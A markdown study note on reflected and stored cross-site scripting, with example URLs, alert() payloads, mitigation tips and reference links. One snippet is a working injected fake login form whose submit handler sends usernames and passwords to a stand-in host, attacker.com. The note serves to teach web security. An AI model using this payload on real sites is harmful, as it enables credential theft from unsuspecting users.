---
title: Cross-Site Scripting (XSS)
draft: false
tags:
  - Reflected
  - Cross-Site
  - Scripting
  - XSS
  - Vulnerability
  - web
  - offensive-security
  - Stored
NeedsReview: true
---
# 🛡️ Reflected Cross-Site Scripting (XSS)

> [!info] What is Reflected XSS?
> Reflected cross-site scripting arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

## 🔍 Example Scenario

Suppose a website has a search function that receives the user-supplied search term in a URL parameter:
```

[https://insecure-website.com/search?term=gift](https://insecure-website.com/search?term=gift)

````
The application echoes the supplied search term in the response:
```html
You searched for: gift
````

> [!warning] Vulnerability  
> If the application does not sanitize or encode the input, an attacker can inject malicious scripts.

### 🚨 Malicious Input Example

An attacker crafts a URL like:

```
https://insecure-website.com/search?term=<script>alert('XSS')</script>
```

Which results in the following response:

```html
You searched for: <script>alert('XSS')</script>
```

> [!danger] Impact  
> If another user clicks this malicious link, the script executes in their browser within the context of their session, potentially leading to session hijacking, data theft, or other malicious actions.


### 🛡️Example of a Simple Injected Fake Login Form
```javascript
document.body.innerHTML = `

  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;display:flex;justify-content:center;align-items:center;">

    <form onsubmit="fetch('https://attacker.com/steal', {method:'POST', body:new FormData(this)}); return false;">

      <h2>Login</h2>

      <input name="username" placeholder="Username" required><br>

      <input name="password" type="password" placeholder="Password" required><br>

      <button type="submit">Login</button>

    </form>

  </div>

`;
```

This would appear as a full-screen login prompt, and most users wouldn’t realize it’s fake.

---

# 🧨 Stored Cross-Site Scripting (XSS)

> [!info] What is Stored XSS?  
> Stored XSS occurs when an application receives data from an untrusted source and permanently stores it (e.g., in a database), then later includes it in dynamic content without proper sanitization.

## 🗄️ Example Scenario

A blog site allows users to submit comments. An attacker submits a comment containing a script:

```html
Great post! <script>alert('Hacked!');</script>
```

If the application does not sanitize this input before storing and later rendering it, every user who views the comment will trigger the script.

> [!warning] Persistence  
> Unlike reflected XSS, stored XSS remains active in the system until removed and affects every user who views the infected content.

> [!danger] Consequences  
> Stored XSS can be more damaging as it spreads automatically to all users without requiring them to click a specific link.

## 🔒 Mitigation

- Sanitize and encode all user input.
- Use Content Security Policy (CSP).
- Prefer frameworks with built-in XSS protection.
- Regularly scan and audit web applications.

## 🔗 Resources

- 🌐 PortSwigger: [Stored Cross-Site Scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting/stored) / [Reflected Cross-Site Scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting/reflected)
- 🌐 OWASP: [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html)
